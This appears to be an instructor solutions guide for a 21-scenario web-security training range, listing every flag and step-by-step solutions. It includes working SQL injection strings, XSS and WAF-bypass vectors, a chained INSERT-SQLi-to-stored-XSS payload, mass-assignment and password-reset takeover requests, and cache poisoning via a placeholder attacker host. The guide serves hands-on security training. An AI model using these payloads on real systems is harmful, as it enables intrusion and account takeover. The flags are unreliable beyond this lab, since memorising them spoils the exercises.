# CSZone Offensive Security Range — Master Solutions Guide (Multi-Port Architecture)

**Confidential — Instructor & Administrator Reference Only**

This guide documents the full 21-port modular architecture for the CSZone CTF Range. Each scenario is isolated on its own dedicated port for clean VPS deployment and professional training execution.

---

## Port Map & Flag Summary Table

| Port | Scenario Name | Category | Vulnerability Class | Flag(s) |
|---|---|---|---|---|
| **8000** | Central Operations Hub | Platform / Landing Portal | Read-Only Scenario Directory & Dispatcher | N/A (Main Portal) |
| **8001** | Scenario 01: Target Recon | Recon / HTTP | Developer Note Clue & HTTP Header Leak | `CTF{h34d3r_hunt3r_pr0}` |
| **8002** | Scenario 02: Robots & Ops | Recon / Traversal | Robots.txt & Sensitive Directory Traversal | `CTF{r0b0ts_d1scl0s3_p4ths}` |
| **8003** | Scenario 03: JS & Crypto | Cryptography | Obfuscated Token & Single-Byte XOR | `CTF{unus3d_v4r14bl3_l34k}` |
| **8004** | Scenario 04: Admin Portal | Access Control | Console Log Leak & Unprotected Admin URL | `CTF{4dm1n_p4n3l_3xp0s3d}` |
| **8005** | Scenario 05: IDOR Invoices | Web / IDOR | Parameter Tampering & Confidential Note Leak | `CTF{1d0r_1nv01c3_l34k}` |
| **8006** | Scenario 06: Crypto & Cookie | Access Control | Partner Token Discovery & Cookie Gateway Bypass | `CTF{h34d3r_c00k13_byp4ss}` |
| **8007** | Scenario 07: Backup Service | Auth / Brute-Force | Salted SHA-256 Hash Cracking & Burp Intruder | `CTF{h4sh_cr4ck3d_4cc3ss}` |
| **8008** | Scenario 08: Vault Finale | Chained Crypto | Dual-Key Gateway & Multi-Byte XOR Decryption | `CTF{f1n4l_ch41n_c0mpl3t3}` |
| **8009** | Scenario 09: Products SQLi | SQL Injection | E-Commerce Filter Boolean Bypass & UNION SQLi | `CTF{un10n_b4s1cs_m4st3r}` |
| **8010** | Scenario 10: Personnel SQLi | SQL Injection | 3-Column UNION-based Database Extraction | `CTF{un10n_s3l3ct_m4st3r}` |
| **8011** | Scenario 11: Asset Inventory SQLi | SQL Injection | Double Quotes, '#' Comments & Schema Enumeration | `CTF{sch3m4_3num_d0ubl3_qu0t3_m4st3r}` |
| **8012** | Scenario 12: Reflected XSS | Cross-Site Scripting | Raw HTML Parameter Reflection & Token Leak | `CTF{r3fl3ct3d_xss_b4s1cs}` |
| **8013** | Scenario 13: Stored Attribute XSS | Cross-Site Scripting | Naive Filter Bypass & Attribute Event Breakout | `CTF{st0r3d_4ttr1but3_br34k0ut}` |
| **8014** | Scenario 14: DOM-based XSS | Cross-Site Scripting | Client-Side URL Routing to innerHTML Sink | `CTF{d0m_xss_s1nk_m4st3r}` |
| **8015** | Scenario 15: WAF Bypass XSS | Cross-Site Scripting | HTML5 SVG Animation & Details Toggle Vectors | `CTF{w4f_byp4ss_h5_v3ct0r}` |
| **8016** | Scenario 16: INSERT SQLi & Stored XSS Chain | Chained Exploit | INSERT SQLi & Second-Order Stored XSS | `CTF{1ns3rt_sqli_t0_st0r3d_xss_ch41n}` |
| **8017** | Scenario 17: Mass Assignment & Profile IDOR | IDOR / BOPLA | Mass Assignment Privilege Escalation | `CTF{m4ss_4ss1gnm3nt_pr0f1l3_0v3rwr1t3}` |
| **8018** | Scenario 18: UUID Identifier Leakage IDOR | IDOR / UUID | Leaked Non-Sequential UUID Access | `CTF{uu1d_l34k_d0cum3nt_v4ult}` |
| **8019** | Scenario 19: Verb Tampering Multi-Tenant IDOR | IDOR / API Auth | RESTful HTTP Verb Tampering Bypass | `CTF{v3rb_t4mp3r1ng_t3n4nt_byp4ss}` |
| **8020** | Scenario 20: BOLA Password Reset ATO | API Security / BOLA | Multi-Step Reset Parameter Tampering | `CTF{b0l4_p4ssw0rd_r3s3t_4cc0unt_t4k30v3r}` |
| **8021** | Scenario 21: Cache Attacks | Web Cache Attacks | Web Cache Deception & Host Cache Poisoning | `CTF{c4ch3_d3c3pt10n_l34k}` |

---

## Detailed Scenario Solutions

### Scenario 01 (Port 8001) — Target Reconnaissance
- **URL:** `http://<host>:8001/`
- **Steps:**
  1. Inspect HTML source (`Ctrl+U`): Top comment contains `CTF{h1dd3n_1n_pl41n_s1ght}`.
  2. Inspect response headers (`curl -I http://<host>:8001/`): `X-Debug-Info` header contains `CTF{h34d3r_hunt3r_pr0}`.

### Scenario 02 (Port 8002) — Robots & Ops Archive
- **URL:** `http://<host>:8002/`
- **Steps:**
  1. Fetch `/robots.txt` -> reveals `/recon-notes/`.
  2. View source on `/recon-notes/` -> comment reveals `ops-archive/`.
  3. View source on `/recon-notes/ops-archive/` -> comment reveals `session-dump.log`.
  4. Fetch `/recon-notes/ops-archive/session-dump.log` -> extract `Q1RGe3IwYjB0c19kMXNjbDAzM19wNHRoc30=` -> Base64 decode to `CTF{r0b0ts_d1scl0s3_p4ths}`.

### Scenario 03 (Port 8003) — JavaScript & XOR Cryptography
- **URL:** `http://<host>:8003/`
- **Steps:**
  1. Inspect `main.js`: `window.__c = 'FgETLiA7ICZmMQojYSdkYTc5Zgo5ZmE+KA=='`.
  2. Inspect `js-config.json`: `"dbg_key": 85`.
  3. Base64 decode and single-byte XOR against `85` -> `CTF{unus3d_v4r14bl3_l34k}`.

### Scenario 04 (Port 8004) — Admin Relocation
- **URL:** `http://<host>:8004/`
- **Steps:**
  1. Open DevTools Console -> decode logged Base64 string `QWRtaW4gcGFuZWwgcmVsb2NhdGVkIHRvIC9wYW5lbC03YzRmMmEv` -> reveals `/panel-7c4f2a/`.
  2. Navigate to `http://<host>:8004/panel-7c4f2a/` -> read `CTF{4dm1n_p4n3l_3xp0s3d}`.

### Scenario 05 (Port 8005) — IDOR Invoices
- **URL:** `http://<host>:8005/invoices/invoice.html?id=1001`
- **Steps:**
  1. Inspect `invoices.json` or tamper `id` parameter to `1007`.
  2. Record 1007 internal notes contain `Q1RGezFkMHJfMW52MDFjM19sMzRrfQ==` -> Base64 decode to `CTF{1d0r_1nv01c3_l34k}`.

### Scenario 06 (Port 8006) — Partner Promo & Client Cookie Gateway Guard
- **URL:** `http://<host>:8006/`
- **Steps:**
  1. Inspect `/robots.txt` -> reveals `/promo-page/` and `/secure/`.
  2. Visit `/promo-page/` -> extract encoded partner credential token `YWNjZXNzX2xldmVsPWFkbWluLTlmM2E=`.
  3. Base64 decode to `access_level=admin-9f3a`.
  4. Visit `/secure/` (initially `403 Access Denied`). Set `Cookie: access_level=admin-9f3a` via Browser DevTools / Header and refresh.
  5. Gateway unlocks and renders `Q1RGe2gzNGQzcl9jMDBrMTNfYnlwNHNzfQ==` -> decodes to flag `CTF{h34d3r_c00k13_byp4ss}`.

### Scenario 07 (Port 8007) — Backup Service Authentication
- **URL:** `http://<host>:8007/backup/login.html`
- **Credentials:** Username `svc_backup`, Salt `9c1f7a`, Password `Summer2024!`
- **Steps:**
  1. Inspect `/backup/users.json` for target schema.
  2. Brute-force `/backup/login.html` with Burp Intruder using candidate list.
  3. Submit `svc_backup` and `Summer2024!` -> unlocks `Q1RGe2g0c2hfY3I0Y2szZF80Y2Mzc3N9` -> `CTF{h4sh_cr4ck3d_4cc3ss}`.

### Scenario 08 (Port 8008) — Central Security Vault Finale
- **URL:** `http://<host>:8008/finale/index.html`
- **Steps:**
  1. Send request with `Cookie: access_level=admin-9f3a` and `?key=Summer2024!`.
  2. Server returns/decrypts ciphertext `ECErFgNDXARea0I7QVwDOhECXUJYEidGEA==` using key `Summer2024!` to `CTF{f1n4l_ch41n_c0mpl3t3}`.

### Scenario 09 (Port 8009) — Products SQL Injection
- **URL:** `http://<host>:8009/products`
- **Steps:**
  1. Boolean bypass: `/products?category=Hardware' OR 1=1 -- -`.
  2. UNION extraction: `/products?category=nonexistent' UNION SELECT title, secret_flag FROM site_secrets -- -`.
  3. Flag: `CTF{un10n_b4s1cs_m4st3r}`.

### Scenario 10 (Port 8010) — Personnel Directory UNION SQLi (Data Type Sequence)
- **URL:** `http://<host>:8010/directory?q=`
- **Steps:**
  1. Test comment: `--` is blocked; `#` (`%23`) is required.
  2. Test column count: `ORDER BY 3%23` (200 OK), `ORDER BY 4%23` (500 Error) -> 3 Columns.
  3. Test data type sequence:
     - `UNION SELECT 'STR1', 'STR2', 'STR3'%23` -> 500 Error (Column 2 is an INTEGER / Numeric column).
     - `UNION SELECT 'STR1', 1337, 'STR3'%23` -> 200 OK (Sequence verified: `TEXT, INTEGER, TEXT`).
  4. Extract flag from `staff_clearances` table:
     - `UNION SELECT officer_name, clearance_level, master_flag FROM staff_clearances%23`
     - Captures flag `CTF{un10n_s3l3ct_m4st3r}`.

### Scenario 11 (Port 8011) — Enterprise Asset Inventory (Schema Enumeration SQLi)
- **URL:** `http://<host>:8011/inventory?q=`
- **Steps:**
  1. **Closing String & Comment:** Parameter is enclosed in double quotes `"`. Test `Servers" #` to break out (`--` is blocked).
  2. **4-Column Typed UNION:** Verify column count and datatypes:
     - `" UNION SELECT 'a', 'b', 1, 1 #` -> 200 OK (Sequence verified: `TEXT, TEXT, INTEGER, INTEGER`).
  3. **Schema Enumeration:** Enumerate tables from SQLite master:
     - `" UNION SELECT type, name, 1, 1 FROM sqlite_master WHERE type="table" #` -> reveals `classified_vault_records`.
     - `" UNION SELECT tbl_name, sql, 1, 1 FROM sqlite_master WHERE tbl_name="classified_vault_records" #` -> reveals columns `(record_name, flag_data, access_pin, vault_level)`.
  4. **Flag Extraction:**
     - `" UNION SELECT record_name, flag_data, access_pin, vault_level FROM classified_vault_records #`
     - Captures flag: `CTF{sch3m4_3num_d0ubl3_qu0t3_m4st3r}`.

### Scenario 12 (Port 8012) — Reflected XSS into HTML Context (Tag Breakout)
- **URL:** `http://<host>:8012/search?q=`
- **Steps:**
  1. Input `test` into search box and observe query reflected in buffer.
  2. Input `<script>alert(1)</script>` -> observation: does NOT execute because it is trapped inside `<textarea>`.
  3. Inspect page source (`Ctrl + U`) -> observe: `<textarea class="query-echo-box" ...><script>alert(1)</script></textarea>`.
  4. Break out of the tag by closing it first: `</textarea><script>alert(1)</script>`.
  5. Script executes immediately, pops up alert, and page automatically reveals `CTF{r3fl3ct3d_xss_b4s1cs}`.

### Scenario 13 (Port 8013) — Stored XSS in Attribute Context
- **URL:** `http://<host>:8013/feedback`
- **Steps:**
  1. Notice `<script>` tags are filtered.
  2. Submit attribute breakout payload in Author field:
     `" onfocus="document.getElementById('reward-panel').innerText=document.getElementById('secret-vault-key').value" autofocus="`
  3. Reload page -> autofocus triggers execution -> Flag: `CTF{st0r3d_4ttr1but3_br34k0ut}`.

### Scenario 14 (Port 8014) — DOM-based XSS (Source to Sink)
- **URL:** `http://<host>:8014/analytics`
- **Steps:**
  1. Inspect `analytics.html` source to identify Source (`location.search`) and Sink (`innerHTML`).
  2. Craft payload in URL parameter `tab`:
     `/analytics?tab=<img src=1 onerror="document.getElementById('extracted-vault').innerText=window.__TELEMETRY_KEY">`
  3. Flag: `CTF{d0m_xss_s1nk_m4st3r}`.

### Scenario 15 (Port 8015) — Advanced WAF & Filter Bypass XSS
- **URL:** `http://<host>:8015/preview`
- **Steps:**
  1. Test input against WAF rules (`<script>`, `onerror=`, `onload=`, `"` are blocked).
  2. Craft HTML5 SVG animation bypass vector without quotes:
     `<svg><animate onbegin=document.getElementById('rule-flag').innerText=document.getElementById('waf-secret').value attributeName=x>`
  3. Flag: `CTF{w4f_byp4ss_h5_v3ct0r}`.

### Scenario 16 (Port 8016) — Chained Exploit: INSERT SQLi to Second-Order Stored XSS
- **URL:** `http://<host>:8016/tickets`
- **Steps:**
  1. Test SQL injection in Department Code field: `SEC'` reveals `INSERT INTO support_tickets ... VALUES ('$submitter', '$department', '$issue_desc', 'LOW', 0)`.
  2. Construct chained INSERT payload in Department Code field:
     `SEC', '<img src=x onerror=alert("cszone")>', 'CRITICAL', 1) --`
  3. Submit the ticket to inject high priority and payload into the database.
  4. Navigate to Admin Compliance Queue: `http://<host>:8016/admin/compliance`.
  5. The high-priority ticket renders unescaped HTML, executing the script and revealing `CTF{1ns3rt_sqli_t0_st0r3d_xss_ch41n}`.

### Scenario 17 (Port 8017) — Mass Assignment & Profile Overwrite IDOR
- **URL:** `http://<host>:8017/profile`
- **Steps:**
  1. Intercept `POST /api/user/profile/update` in Burp Suite.
  2. Inject privileged attributes into JSON body: `{"user_id": 102, "full_name": "Carlos Rivera", "role": "admin", "is_vip": 1}`.
  3. Submit request to elevate role to `admin`.
  4. Navigate to Executive Security Console: `http://<host>:8017/admin/dashboard` to capture `CTF{m4ss_4ss1gnm3nt_pr0f1l3_0v3rwr1t3}`.

### Scenario 18 (Port 8018) — Obfuscated & UUID Identifier Leakage IDOR
- **URL:** `http://<host>:8018/vault`
- **Steps:**
  1. Inspect Public Activity & Audit Feed at `http://<host>:8018/activity` (or `GET /api/public/audit-feed`).
  2. Discover leaked Chief Security Officer document UUID: `8f9b2c34-91a0-4d5e-88fc-3176d1e49e22`.
  3. Exploit IDOR endpoint: `http://<host>:8018/vault/view?doc_id=8f9b2c34-91a0-4d5e-88fc-3176d1e49e22` (or `GET /api/documents/download?doc_id=...`).
  4. Download classified document and extract flag: `CTF{uu1d_l34k_d0cum3nt_v4ult}`.

### Scenario 19 (Port 8019) — RESTful HTTP Verb Tampering & Multi-Tenant IDOR
- **URL:** `http://<host>:8019/workspaces`
- **Steps:**
  1. Send `GET /api/workspaces/tenant-99-enterprise/settings` -> observe `403 Forbidden`.
  2. Perform HTTP Verb Tampering in Burp Suite: change method from `GET` to `PUT` with JSON body `{"region": "us-west-2", "compliance_mode": "disabled"}`.
  3. The backend bypasses the access check on `PUT` and returns the tenant's `master_secret_key`: `CTF{v3rb_t4mp3r1ng_t3n4nt_byp4ss}`.

### Scenario 20 (Port 8020) — BOLA Multi-Step Password Reset Account Takeover
- **URL:** `http://<host>:8020/login`
- **Steps:**
  1. Request reset session for Carlos: `POST /api/auth/forgot-password` with `{"email": "carlos@apexpay.io"}`.
  2. Exploit BOLA in OTP verification: `POST /api/auth/verify-reset-step` with `{"session_token": "<token>", "otp": "654321", "account_id": 100}` -> leaks Admin reset token!
  3. Apply new password for admin: `POST /api/auth/confirm-new-password` with `{"reset_token": "<admin_token>", "new_password": "NewAdminPass123!"}`.
  4. Log in at `http://<host>:8020/login` with `admin@apexpay.io` and new password -> capture `CTF{b0l4_p4ssw0rd_r3s3t_4cc0unt_t4k30v3r}`.

### Scenario 21 (Port 8021) — Web Cache Attacks
- **URL:** `http://<host>:8021/`
- **Steps:**
  1. **Cache Deception:** Log in as victim, request `/account/profile/legacy-theme.css`. Issue unauthenticated GET to the same path -> cache HIT returns `CTF{c4ch3_d3c3pt10n_l34k}`.
  2. **Cache Poisoning:** GET `/promo/partner-banner` with `X-Forwarded-Host: evil-attacker-domain.test` -> primes cache for all visitors.
